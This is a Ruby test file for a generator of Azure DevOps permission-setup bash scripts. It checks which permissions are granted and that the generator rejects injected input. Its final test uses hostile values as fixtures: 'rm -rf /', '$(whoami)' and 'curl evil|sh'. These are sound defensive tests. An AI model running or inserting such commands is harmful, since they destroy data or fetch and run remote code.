# frozen_string_literal: true

require "test_helper"

module AzureDevops
  class SetupScriptTest < ActiveSupport::TestCase
    TENANT = "0d421812-dc08-4360-ae7c-49f1c4403165"
    CLIENT = "32f420a7-0c91-4a35-bfe8-80ad4869b837"

    def script(**overrides)
      SetupScript.new(organization: "contoso", tenant_id: TENANT, client_id: CLIENT, **overrides).to_s
    end

    def assert_valid_bash(text)
      Tempfile.create([ "setup", ".sh" ]) do |file|
        file.write(text)
        file.flush
        _out, err, status = Open3.capture3("bash", "-n", file.path)
        assert_predicate status, :success?, err
      end
    end

    test "both permission sets are well-formed shell" do
      assert_valid_bash(script(flavor: "contributors"))
      assert_valid_bash(script(flavor: "custom"))
    end

    test "Contributors adds the app with a Basic license and the project Contributors group" do
      text = script

      assert_includes text, "accountLicenseType"
      assert_includes text, "express"
      assert_includes text, "projectContributor"
      assert_not_includes text, "repoV2"
    end

    test "the custom set grants only what Aixle needs, on the identity rather than a group" do
      text = script(flavor: "custom")

      %w[GenericRead GenericContribute CreateBranch PullRequestContribute WORK_ITEM_READ WORK_ITEM_WRITE ViewBuilds].each do |action|
        assert_includes text, action
      end
      assert_not_includes text, "projectContributor"
      assert_not_includes text, "ForcePush"
      assert_not_includes text, "PolicyExempt"
      assert_not_includes text, "PullRequestBypassPolicy"
    end

    test "Service Hooks can be left out" do
      assert_includes script(service_hooks: true), "SERVICE_HOOKS=1"
      assert_includes script(service_hooks: false), "SERVICE_HOOKS=0"
    end

    test "names the organization and the app, and takes project names as arguments" do
      text = script

      assert_includes text, "ORG='contoso'"
      assert_includes text, "CLIENT_ID='#{CLIENT}'"
      assert_includes text, %(Usage: $0 <Azure DevOps project name>...)
    end

    test "refuses anything that is not the expected shape, so nothing can be injected" do
      assert_raises(ValidationFailed) { script(client_id: "'; rm -rf / #") }
      assert_raises(ValidationFailed) { script(tenant_id: "$(whoami)") }
      assert_raises(ValidationFailed) { SetupScript.new(organization: "x; curl evil|sh", tenant_id: TENANT, client_id: CLIENT) }
      assert_raises(ValidationFailed) { script(flavor: "admin") }
    end
  end
end
